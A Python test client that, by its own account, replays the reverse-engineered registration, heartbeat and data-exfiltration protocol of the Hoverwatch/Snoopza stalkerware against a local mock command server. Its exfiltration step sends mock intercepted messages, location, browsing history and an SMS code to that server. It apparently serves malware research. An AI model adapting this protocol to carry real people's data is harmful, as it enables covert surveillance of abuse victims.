#!/usr/bin/env python3
"""
Refog Mock C2 — Test Client
===========================
Simulates Hoverwatch / Snoopza app traffic against the mock C2.
Reproduces the exact protocol extracted from reverse engineering (v3 findings).

Usage:
    uv run python test_client.py [--base-url https://127.0.0.1:8443] [--brand HWA|SNPA|HWA_TST]

The full protocol flow exercised:
    1. Registration         POST /api/online/registration/
    2. Update check + brand GET  /api/online/programversion/{brand}/
    3. Heartbeat            POST /api/online/check/
    4. Sync (settings ver)  POST /api/online/check/  with x-settings-ver header
    5. Exfiltration         POST /api/online/logs/   multipart/form-data with logNNNN parts
    6. Exception            POST /api/online/exceptionlog/  multipart with exceptionNNNN
    7. Dashboard summary    GET  /
"""

import argparse
import json
import ssl
import urllib.request
import urllib.error
import uuid


# ---------------------------------------------------------------------------
# HTTP plumbing — no SSL verification, mimics Hoverwatch's TrustAllManager
# ---------------------------------------------------------------------------

def make_request(
    url: str,
    method: str = "GET",
    data: dict | bytes | None = None,
    headers: dict | None = None,
    content_type: str | None = None,
) -> tuple[int, str]:
    """Make HTTP request with no SSL verification (like Hoverwatch)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    if isinstance(data, dict):
        body = json.dumps(data).encode("utf-8")
        content_type = content_type or "application/json"
    elif isinstance(data, bytes):
        body = data
    else:
        body = None

    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", "Android Monitor 7.5.369")
    req.add_header("Connection", "Keep-Alive")
    if content_type:
        req.add_header("Content-Type", content_type)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return -1, str(e)


# ---------------------------------------------------------------------------
# Multipart builder — mimics Apache HttpClient MultipartEntityBuilder output
# (cf. d.a.a.a.f.d.k in the DEX). Each part has a Content-Disposition header
# with name="logNNNN" and a Content-Type matching the part body.
# ---------------------------------------------------------------------------

def build_multipart(parts: list[tuple[str, str, str]]) -> tuple[bytes, str]:
    """Build a multipart/form-data body.
    parts: list of (name, content_type, body_str) tuples
    Returns (body_bytes, full_content_type_with_boundary).
    """
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
    lines = []
    for name, ctype, body in parts:
        lines.append(f"--{boundary}")
        lines.append(f'Content-Disposition: form-data; name="{name}"')
        lines.append(f"Content-Type: {ctype}")
        lines.append("")
        lines.append(body)
    lines.append(f"--{boundary}--")
    lines.append("")
    raw = "\r\n".join(lines).encode("utf-8")
    return raw, f"multipart/form-data; boundary={boundary}"


# ---------------------------------------------------------------------------
# Protocol steps
# ---------------------------------------------------------------------------

def test_registration(base: str) -> str | None:
    """Step 1: Register device."""
    print("\n" + "=" * 60)
    print("📱 STEP 1 — Registration")
    print("=" * 60)

    payload = {
        "username": "abuser@evil.com",
        "password": "P@ssw0rd!",
        "hid": f"and:{uuid.uuid4().hex[:16]}",
        "device_name": "Samsung Galaxy S23",
        "client_ver": "7.5.369",
        "os_ver": "13",
        # Per C0867b0$a enum: 0=CHILD, 1=EMPLOYEE, 2=OWN, 3=UNDEFINED
        "user_type": 0,
        "device.dev_mac_adr_str": "AA:BB:CC:DD:EE:FF",
        "device.dev_mac2_adr_str": "AA:BB:CC:DD:EE:00",
        "device.dev_serial_num_str": "R58X1234567",
        "device.dev_imei_str": "353456789012345",
        "device.dev_accounts_str": "victim@gmail.com",
        "device.perm_101": 1,
        "device.perm_102": 1,
        "device.perm_103": 1,
        "device.perm_116": 1,
        "device.perm_118": 1,
        "device.perm_121": 1,
        "device.perm_128": 1,
        "device.perm_129": 1,
        "device.perm_130": 1,
    }

    code, resp = make_request(f"{base}/api/online/registration/", "POST", payload)
    print(f"  HTTP {code}")

    try:
        data = json.loads(resp)
        print(f"  status:        {data.get('status')}")
        print(f"  auth_key:      {data.get('auth_key')}")
        print(f"  valid_through: {data.get('valid_through')}")
        print(f"  subscription:  {data.get('subscription')}")
        print(f"  domains:       {data.get('domains')}")
        print(f"  client_pin:    {data.get('client_pin')}")
        if data.get("settings"):
            print(f"  settings ver:  {data['settings'].get('version')}")
        return data.get("auth_key")
    except json.JSONDecodeError:
        print(f"  Raw: {resp[:200]}")
        return None


def test_update_check(base: str, brand: str, auth_key: str | None = None):
    """Step 2: Update check — also reveals the brand server-side."""
    print("\n" + "=" * 60)
    print(f"📦 STEP 2 — Update check (brand={brand})")
    print("=" * 60)

    headers = {"x-auth-key": auth_key} if auth_key else None
    code, resp = make_request(f"{base}/api/online/programversion/{brand}/", headers=headers)
    print(f"  HTTP {code} — {resp[:100]}")


def test_check(base: str, auth_key: str):
    """Step 3: Heartbeat / ping."""
    print("\n" + "=" * 60)
    print("💓 STEP 3 — Heartbeat (check)")
    print("=" * 60)

    code, resp = make_request(
        f"{base}/api/online/check/", "POST",
        headers={"x-auth-key": auth_key},
    )
    print(f"  HTTP {code} — {resp[:100]}")


def test_sync_settings(base: str, auth_key: str):
    """Step 4: Sync with settings header."""
    print("\n" + "=" * 60)
    print("⚙️  STEP 4 — Sync with x-settings-ver")
    print("=" * 60)

    code, resp = make_request(
        f"{base}/api/online/check/", "POST",
        headers={
            "x-auth-key": auth_key,
            "x-settings-ver": "99",
            "x-client-event": "sync_triggered",
        },
    )
    print(f"  HTTP {code} — {resp[:100]}")


def test_exfil_logs(base: str, auth_key: str):
    """Step 5: Exfiltrate stolen data via multipart/form-data.
    Each part is a logNNNN with a JSON body — same format as the real app."""
    print("\n" + "=" * 60)
    print("📡 STEP 5 — Exfiltrate (multipart logs)")
    print("=" * 60)

    # Build realistic JSON payloads matching the InstantMessage Gson DTO
    # (cf. hoverwatch_analysis.md §9.5.2).
    parts = [
        # log0001: IM message intercept (WhatsApp text from Alice)
        ("log0001", "application/json", json.dumps({
            "N": 1,
            "time": 1712000000000,
            "sec": 43200,
            "seen": 1712000010000,
            "text": "[MOCK] Hey, where are you? Can we meet?",
            "len": 38,
            "direct": "INBOUND",
            "from": "Alice",
            "type": 0,
        })),
        # log0002: IM message outbound (victim's reply)
        ("log0002", "application/json", json.dumps({
            "N": 2,
            "time": 1712000050000,
            "sec": 43250,
            "text": "[MOCK] Working from home today",
            "len": 30,
            "direct": "OUTBOUND",
            "from": "victim",
            "type": 0,
        })),
        # log0003: Location event
        ("log0003", "application/json", json.dumps({
            "loc": {
                "cat": 1,
                "crd": [48.8566, 2.3522],
                "acc": 15.0,
                "spd": 0.0,
                "ssid": "VictimHome",
                "bssid": "AA:BB:CC:DD:EE:FF",
                "cellid": "208-01-1234-5678",
            }
        })),
        # log0004: Browser visit (history scrape)
        ("log0004", "application/json", json.dumps({
            "url": "https://example.com/article",
            "title": "How to safely leave",
            "date": 1712000100000,
            "package": "com.android.chrome",
        })),
        # log0005: SMS
        ("log0005", "application/json", json.dumps({
            "sms": {
                "from": "+33612345678",
                "text": "[MOCK] Verification code: 854213",
                "date": 1712000200000,
                "direct": "INBOUND",
            }
        })),
    ]

    body, ctype = build_multipart(parts)

    code, resp = make_request(
        f"{base}/api/online/logs/", "POST", body,
        headers={"x-auth-key": auth_key, "Content-Type": ctype, "Content-Length": str(len(body))},
        content_type=ctype,
    )
    print(f"  HTTP {code} — {resp[:100]}")
    print(f"  Sent {len(parts)} parts ({len(body)} bytes total)")
    print(f"     log0001-2 = IM messages | log0003 = location | log0004 = browser | log0005 = SMS")


def test_exception_log(base: str, auth_key: str):
    """Step 6: Send exception log (multipart with exceptionNNNN parts)."""
    print("\n" + "=" * 60)
    print("🐛 STEP 6 — Exception log (multipart)")
    print("=" * 60)

    parts = [
        ("exception0001", "application/json", json.dumps({
            "type": "EX",
            "description": "java.lang.NullPointerException at p094hw.utils.ServiceCore",
            "stack": "143012.456 Ex: NullPointerException; Msg: null; Class: ServiceCore; Method: onStartCommand; Line: 42",
            "version_app": "7.5.369",
            "version_os": "13",
            "device": "Samsung Galaxy S23",
        })),
    ]
    body, ctype = build_multipart(parts)

    code, resp = make_request(
        f"{base}/api/online/exceptionlog/", "POST", body,
        headers={"x-auth-key": auth_key, "Content-Type": ctype},
        content_type=ctype,
    )
    print(f"  HTTP {code} — {resp[:100]}")


def test_dashboard(base: str):
    """Check the dashboard."""
    print("\n" + "=" * 60)
    print("📊 DASHBOARD")
    print("=" * 60)

    code, resp = make_request(f"{base}/")
    try:
        data = json.loads(resp)
        print(f"  Server:                {data.get('server')} v{data.get('version')}")
        print(f"  Registered devices:    {data.get('registered_devices')}")
        print(f"  Killed/Locked/Banned:  {data.get('killed_devices')}/{data.get('locked_devices')}/{data.get('banned_devices')}")
        print("  Stats by brand:")
        for brand, st in (data.get("stats_by_brand") or {}).items():
            if st.get("exfil_requests") or st.get("devices"):
                print(
                    f"    {brand:8s} → dev={st['devices']} "
                    f"exfil={st['exfil_requests']} ({st['exfil_bytes']}B) "
                    f"msg={st['messages_intercepted']} loc={st['locations_intercepted']}"
                )
        for d in data.get("devices", []):
            print(f"    → [{d.get('brand'):7s}] {d['username']} | {d['device_name']} | type={d.get('user_type')} | imei={d.get('imei')}")
    except json.JSONDecodeError:
        print(f"  Raw: {resp[:200]}")


def test_admin_kill(base: str, auth_key: str):
    """Trigger kill switch then verify next /check/ returns 410."""
    print("\n" + "=" * 60)
    print("☠️  STEP 7 — Admin kill switch + verification")
    print("=" * 60)

    code, resp = make_request(f"{base}/admin/kill/{auth_key}", "POST", data=b"")
    print(f"  Arm kill: HTTP {code} — {resp[:100]}")

    code, resp = make_request(
        f"{base}/api/online/check/", "POST",
        headers={"x-auth-key": auth_key},
    )
    print(f"  Next /check/ → HTTP {code} (expected 410) — {resp[:100]}")

    # Clear so the rest of the test suite doesn't break
    make_request(f"{base}/admin/clear/{auth_key}", "POST", data=b"")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Refog Mock C2 — Test Client")
    parser.add_argument("--base-url", default="https://127.0.0.1:8443", help="Base URL of mock C2")
    parser.add_argument("--brand", default="HWA", choices=["HWA", "HWA_TST", "SNPA"],
                        help="Brand to simulate (HWA=Hoverwatch, SNPA=Snoopza, HWA_TST=test)")
    parser.add_argument("--skip-kill", action="store_true", help="Skip the kill switch test")
    args = parser.parse_args()
    base = args.base_url.rstrip("/")

    print(f"🎯 Testing Refog mock C2 at {base} as brand={args.brand}")

    # Full protocol simulation
    auth_key = test_registration(base)
    if not auth_key:
        print("❌ Registration failed, aborting")
        return

    test_update_check(base, args.brand, auth_key)
    test_check(base, auth_key)
    test_sync_settings(base, auth_key)
    test_exfil_logs(base, auth_key)
    test_exception_log(base, auth_key)
    if not args.skip_kill:
        test_admin_kill(base, auth_key)
    test_dashboard(base)

    print("\n" + "=" * 60)
    print("✅ All protocol steps completed")
    print("=" * 60)
    print(f"\nLogs in: ./logs/  (registrations/, exfil/, exceptions/, raw/)")


if __name__ == "__main__":
    main()
